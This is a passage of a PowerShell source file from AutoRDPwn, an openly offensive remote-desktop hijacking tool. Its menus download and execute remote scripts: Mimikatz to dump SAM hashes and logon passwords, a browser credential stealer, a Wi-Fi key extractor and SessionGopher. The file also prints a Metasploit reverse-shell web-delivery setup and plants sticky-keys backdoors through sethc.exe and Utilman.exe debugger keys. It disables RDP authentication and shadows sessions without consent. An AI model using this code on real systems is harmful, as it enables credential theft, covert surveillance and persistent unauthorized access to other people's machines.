        if($shell -in '1','2','3','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }}

        if($module -like '2') { Show-Banner
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt9" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt10" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt49" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt59" -ForegroundColor Gray    
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
        Write-Host ; $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
        $Host.UI.RawUI.ForegroundColor = 'Green' ; $passandhash = $Host.UI.ReadLine() ; Write-Host

        if($passandhash -like '1') { Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500
        Write-Host ; Write-Host "$txt13" -ForegroundColor Blue ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-Mimikatz.ps1')
        Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam exit" | Set-Clipboard ; Get-Clipboard
        $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; Start-Sleep -milliseconds 2500 }

        if($passandhash -like '2') { Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500
        Write-Host ; Write-Host "$txt13" -ForegroundColor Blue ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-Mimikatz.ps1')
        Invoke-Mimikatz -Command "privilege::debug token::elevate sekurlsa::logonPasswords exit" | Set-Clipboard ; Get-Clipboard
        $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; Start-Sleep -milliseconds 2500 }

        if($passandhash -like '3') { Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 ; $Host.UI.RawUI.ForegroundColor = 'Gray'
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-SharpWeb.ps1')
        .\SharpWeb.exe all | Set-Clipboard ; Get-Clipboard ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; pause ; del .\SharpWeb.exe ; Start-Sleep -milliseconds 2500 }

        if($passandhash -like '4') { Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 ; $Host.UI.RawUI.ForegroundColor = 'Gray'
        function Get-Wlan-Keys {[CmdletBinding()]Param ()
        $wlans = netsh wlan show profiles | Select-String -Pattern "$txt58" | Foreach-Object {$_.ToString()}
        $exportdata = $wlans | Foreach-Object {$_.Replace("    $txt58     : ",$null)}
        $exportdata | ForEach-Object {netsh wlan show profiles name="$_" key=clear}}
        $wifikey = Get-Wlan-Keys ; if (!($wifikey -like "*Wi-Fi*")){ Write-Host ; Write-Host "$txt60" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 } 
        else { Write-Host ; $wifikey | Set-Clipboard ; Get-Clipboard ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; pause }}
        
        if($passandhash -like 'X'){ $input = 'x' ; continue }
        if($passandhash -in '1','2','3','4','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }}

        if($module -like '3') { Show-Banner
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - TCP Port Scan" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Local Port Forwarding" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - Powershell Web Server" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
        Write-Host ; $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}

        $Host.UI.RawUI.ForegroundColor = 'Green' ; $networking = $Host.UI.ReadLine() ; Write-Host
        if($networking -like '1') { Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 ; Write-Host
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-Portscan.ps1')
        Write-host "$txt55" -NoNewLine -ForegroundColor Gray ; $porthost = $Host.UI.ReadLine() ; Write-Host
        Write-host "$txt56" -NoNewLine -ForegroundColor Gray ; $threads = $Host.UI.ReadLine() ; Write-Host
        Write-host "$txt57" -NoNewLine -ForegroundColor Gray ; $topports = $Host.UI.ReadLine() ; $Host.UI.RawUI.ForegroundColor = 'Blue'
        Invoke-Portscan -Hosts $porthost -T $threads -TopPorts $topports ;  $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Progress " " -completed ; pause ; Start-Sleep -milliseconds 2500 }

        if($networking -like '2') { Show-Banner
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt14" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt15" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt16" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt20" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
        Write-Host ; $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}

        $Host.UI.RawUI.ForegroundColor = 'Green' ; $forwarding = $Host.UI.ReadLine() ; Write-Host
        if($forwarding -like '1') { Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 ; Write-Host ; Write-Host "$txt41" -NoNewLine -ForegroundColor Gray
        $lport = $Host.UI.ReadLine() ; Write-Host ; Write-Host "$txt42" -NoNewLine -ForegroundColor Gray ; $lhost = $Host.UI.ReadLine() ; Write-Host
        Write-Host "$txt43" -NoNewLine -ForegroundColor Gray ; $rport = $Host.UI.ReadLine() ; Write-Host ; Write-Host "$txt44" -NoNewLine -ForegroundColor Gray ; $rhost = $Host.UI.ReadLine()
        netsh interface portproxy add v4tov4 listenport=$lport listenaddress=$lhost connectport=$rport connectaddress=$rhost ; Write-Host "$txt45" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 }

        if($forwarding -like '2') { Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 ; Write-Host ; Write-Host "$txt41" -NoNewLine -ForegroundColor Gray
        $rlport = $Host.UI.ReadLine() ; Write-Host ; Write-Host "$txt42" -NoNewLine -ForegroundColor Gray ; $rlhost = $Host.UI.ReadLine() ; Write-Host
        Write-Host "$txt43" -NoNewLine -ForegroundColor Gray ; $rrport = $Host.UI.ReadLine() ; Write-Host ; Write-Host "$txt44" -NoNewLine -ForegroundColor Gray ; $rrhost = $Host.UI.ReadLine()
        $remoteforward = "true" ; Write-Host ; Write-Host "$txt46" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 }

        if($forwarding -like '3') { Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 ; $proxy = netsh interface portproxy show all
        if(!$proxy){ Write-Host ; Write-Host "$txt47" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 } else { $Host.UI.RawUI.ForegroundColor = 'Gray' ; netsh interface portproxy show all ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; Start-Sleep -milliseconds 2500 }}

        if($forwarding -like '4') { Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 ; $proxy = netsh interface portproxy show all
        if(!$proxy){ Write-Host ; Write-Host "$txt47" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 } else { netsh interface portproxy reset ; Write-Host "$txt48" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }}

        if($forwarding -like 'X'){ $input = 'x' ; continue }
        if($forwarding -in '1','2','3','4','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }}

        if($networking -like '3') { $webserver ="true" ; Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 }

        if($networking -like 'X'){ $input = 'x' ; continue }
        if($networking -in '1','2','3','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }}
   
        if($module -like '4') { Show-Banner
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt11" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt12" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt61" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
        Write-Host ; $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
        $Host.UI.RawUI.ForegroundColor = 'Green' ; $forensics = $Host.UI.ReadLine() ; Write-Host

        if($forensics -like '1') { Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 ; Write-Host ; Write-Host "$txt19" -ForegroundColor Red ; $Host.UI.RawUI.ForegroundColor = 'Gray'
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/RDP-Caching.ps1') ; explorer $env:temp\Recovered_RDP_Session
        $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Progress " " -completed ; pause ; Remove-Item -path $env:temp\Recovered_RDP_Session -Recurse -Force ; Start-Sleep -milliseconds 2500 }

        if($forensics -like '2') { Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/ListAllUsers.ps1') | Set-Clipboard ; Get-Clipboard
        ListAllUsers | Set-Clipboard ; Get-Clipboard ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; pause ; Start-Sleep -milliseconds 2500 }
        
        if($forensics -like '3') { Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/SessionGopher.ps1')
        Invoke-SessionGopher -Thorough | Set-Clipboard ; Get-Clipboard ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; Start-Sleep -milliseconds 2500 }

        if($forensics -like 'X'){ $input = 'x' ; continue }
        if($forensics -in '1','2','3','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }}
        
        if($module -like '5') { Show-Banner
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - Sticky Keys Hacking" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - Metasploit Web Delivery" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - Remote Keylogger" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
        Write-Host ; $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
        $Host.UI.RawUI.ForegroundColor = 'Green' ; $backdoor = $Host.UI.ReadLine() ; Write-Host
        
        if($backdoor -like '1') { $stickykeys ="true" ; Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 }

        if($backdoor -like '2') { $metasploit = "true" ; Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 
        $metarandom = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_}) ; Write-Host
        Write-host "$txt65" -NoNewLine -ForegroundColor Gray ; $metaserver = $Host.UI.ReadLine() ; $Host.UI.RawUI.ForegroundColor = 'Gray'
        Write-Host ; Write-Host "$txt63" -ForegroundColor Red ; Write-Host ; Write-host "use exploit/multi/script/web_delivery"
        Write-host "set SRVHOST $metaserver" ; Write-host "set SRVPORT 4433" ; Write-host "set SSL false" ; Write-host "set target 2"
        Write-host "set payload windows/meterpreter/reverse_tcp" ; Write-host "set LHOST $metaserver"
        Write-host "set ExitOnSession false" ; Write-host "set EnableStageEncoding true"
        Write-host "set LPORT 4444" ; Write-host "set URIPATH $metarandom" ; Write-host "exploit"
        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; Start-Sleep -milliseconds 2500 }

        if($backdoor -like '3') { $getkeys ="true" ; Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 }

        if($backdoor -like 'X'){ $input = 'x' ; continue }
        if($backdoor -in '1','2','3','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }}

        if($module -like '6') { Show-Banner
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt70" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt71" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt72" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
        Write-Host ; $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
        $Host.UI.RawUI.ForegroundColor = 'Green' ; $privesc = $Host.UI.ReadLine() ; Write-Host

        if($privesc -like '1') { Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Chachi-Enumerator.ps1')
        Comprueba-Todo ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; Start-Sleep -milliseconds 2500 }
        
        if($privesc -like '2'){ Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Sherlock.ps1')
        Find-AllVulns ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; Start-Sleep -milliseconds 2500 }
        
        if($privesc -like '3'){ Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/PowerUp.ps1')
        Invoke-AllChecks ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; Start-Sleep -milliseconds 2500 }
        
        if($privesc -like 'X'){ $input = 'x' ; continue }
        if($privesc -in '1','2','3','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }}

        if($module -like '7') { Show-Banner
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt18" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt62" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt67" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
        Write-Host ; $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
        $Host.UI.RawUI.ForegroundColor = 'Green' ; $othermodule = $Host.UI.ReadLine() ; Write-Host

        if($othermodule -like '1') { Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-Phant0m.ps1')
        Invoke-Phant0m ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; Start-Sleep -milliseconds 2500 }
        
        if($othermodule -like '2'){ $vncserver ="true" ; Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 }
        
        if($othermodule -like '3') { Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 ; Write-Host
        do { Write-Host "$txt73" -NoNewLine -ForegroundColor Gray ; $externalscript = $Host.UI.ReadLine() ; Write-Host
        if(!$externalscript) { Write-Host "$txt6" -ForegroundColor Red ; Write-Host ; Start-Sleep -milliseconds 2500 }}
        until ( $externalscript) ; Write-Host "$txt74" -NoNewLine -ForegroundColor Gray ; $externalfunction = $Host.UI.ReadLine() 
        $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
        if($externalscript -like 'http*') { Invoke-Expression (New-Object Net.WebClient).DownloadString("$externalscript") } 
        else { Import-Module $externalscript } ; if($externalfunction){ Invoke-Expression $externalfunction }
        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; Start-Sleep -milliseconds 2500 }

        if($othermodule -like 'X'){ $input = 'x' ; continue }
        if($othermodule -in '1','2','3','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }}

        if($module -like 'X'){ $input = 'x' ; continue } ; if($module -in '1','2','3','4','5','6','7','m','x') { $null }
        else { Write-Host "$txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }}

        'X' { continue }
        default { Write-Host ; Write-Host "$txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }}} until ($input -in '1','2','3','4','5','6','7','X')

   if($input -in '1','2','3','4','5','7'){ $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; if($hash){ $user = "AutoRDPwn" ; $password = "AutoRDPwn" | ConvertTo-SecureString -AsPlainText -Force }
   $Host.UI.RawUI.ForegroundColor = 'Green' ; winrm quickconfig -quiet ; Set-Item wsman:\localhost\client\trustedhosts * -Force
   Set-NetConnectionProfile -InterfaceAlias "Ethernet*" -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias "Wi-Fi*" -NetworkCategory Private
   if(!$user) { $RDP = New-PSSession -Computer $computer -Authentication Negotiate } ; if($user) { $credential = New-Object System.Management.Automation.PSCredential ( $user, $password ) 
   $RDP = New-PSSession -Computer $computer -credential $credential -Authentication Negotiate } ; $session = get-pssession ; if ($session){

        do { $Host.UI.RawUI.ForegroundColor = 'Green' ; if($stickykeys){ $input = "control" } elseif($shadowoption -like '-shadow') { $input=$args[7] } else {
        Write-Host ; Write-Host "$txt29" -NoNewLine -ForegroundColor Gray ; $input = $Host.UI.ReadLine()}
        switch -wildcard ($input) {

        'ver' { $control = "false" ; Write-Host
        invoke-command -session $RDP[0] -scriptblock { REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4 /f 2>&1> $null
        Write-Host "$using:txt30" -ForegroundColor Blue }}

        'see' { $control = "false" ; Write-Host
        invoke-command -session $RDP[0] -scriptblock { REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4 /f 2>&1> $null
        Write-Host "$using:txt30" -ForegroundColor Blue }}

        'control*' { $control = "true" ; Write-Host
        invoke-command -session $RDP[0] -scriptblock { REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f 2>&1> $null
        Write-Host "$using:txt31" -ForegroundColor Blue }}

        default { Write-Host ; Write-Host "$txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }}} until ($input -in 'ver','see','controlar','control')

    invoke-command -session $RDP[0] -scriptblock {
    REG ADD "HKLM\SOFTWARE\Microsoft\WBEM\CIMOM" /v AllowAnonymousCallback /t REG_DWORD /d 1 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v AutoShareWks /t REG_DWORD /d 1 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v AutoShareServer /t REG_DWORD /d 1 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v AllowRemoteRPC /t REG_DWORD /d 1 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Remote Assistance" /v fAllowToGetHelp /t REG_DWORD /d 1 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Remote Assistance" /v fAllowFullControl /t REG_DWORD /d 1 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f 2>&1> $null
    REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f 2>&1> $null }
    REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters" /v AllowEncryptionOracle /t REG_DWORD /d 2 /f 2>&1> $null
    Write-Host ; Write-Host "$txt32" -ForegroundColor Blue ; $hostname = invoke-command -session $RDP[0] -scriptblock { $env:computername }
    Write-Host ; Write-Host "$txt33" -NoNewLine ; Write-Host $hostname.tolower() -ForegroundColor Gray
    $version = invoke-command -session $RDP[0] -scriptblock { (Get-WmiObject -class Win32_OperatingSystem).Caption } ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host

    if($vncserver){ $base64 = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-VNCServer.ps1')
    invoke-command -session $RDP[0] -scriptblock { $base64array = ($using:base64).ToCharArray() ; [array]::Reverse($base64array) ; -join $base64array 2>&1> $null
    $base64string = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64array"))
    Invoke-Expression $base64string | Out-Null ; Invoke-Vnc -ConType bind -Port 5900 -Password AutoRDPwn }}
        
    if ($stickykeys){ invoke-command -session $RDP[0] -scriptblock {
    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "powershell.exe -noexit ; clear" /f 2>&1> $null
    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" /v Debugger /t REG_SZ /d "powershell.exe -noexit ; clear" /f 2>&1> $null
    powercfg /setacvalueindex scheme_current sub_video videoconlock 2400 2>&1> $null ; powercfg /setdcvalueindex scheme_current sub_video videoconlock 2400 2>&1> $null }}

        if($version -Like '*Server*') { Write-Host "$version $txt34" -ForegroundColor Red ; invoke-command -session $RDP[0] -scriptblock { $Host.UI.RawUI.ForegroundColor = 'Green'
        (Get-WmiObject -class Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) 2>&1> $null
        Write-Host ; Write-Host "$using:txt35" -ForegroundColor Blue ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; query session }
        $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Host "$txt36" -NoNewLine -ForegroundColor Gray ; $shadow = $Host.UI.ReadLine()
        if($OSVersion -like 'Unix'){ if(!$user){ xfreerdp /v:$computer /restricted-admin /u:$user } else { xfreerdp /v:$computer /admin /u:$user /p:$password }}
        if(!$nogui){ if($vncserver){ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-VNCViewer.ps1')
        if($control -eq 'true') { .\VNCViewer.exe /password AutoRDPwn $computer } if($control -eq 'false') { .\VNCViewer.exe /password AutoRDPwn /viewonly $computer }} else {
        if($control -eq 'true') { if($stickykeys){ mstsc /v $computer /admin /f } elseif (!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /control /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
        if($control -eq 'false') { if(!$user){ mstsc /v $computer /restrictedadmin /shadow:$shadow /noconsentprompt /f } else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}}}}

        else { Write-Host "$version $txt37" -ForegroundColor Red ; if(!$vncserver){ 
        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-RDPwrap.ps1')
        invoke-command -session $RDP[0] -scriptblock { Set-Content -Path Setup.msi -Value $using:RDPWrap -Encoding Byte 
        msiexec /i "Setup.msi" /quiet /qn /norestart ; netsh advfirewall firewall delete rule name="$using:Pwn6" 2>&1> $null ; del .\Setup.msi
        netsh advfirewall firewall add rule name="$using:Pwn6" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
        netsh advfirewall firewall add rule name="$using:Pwn6" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
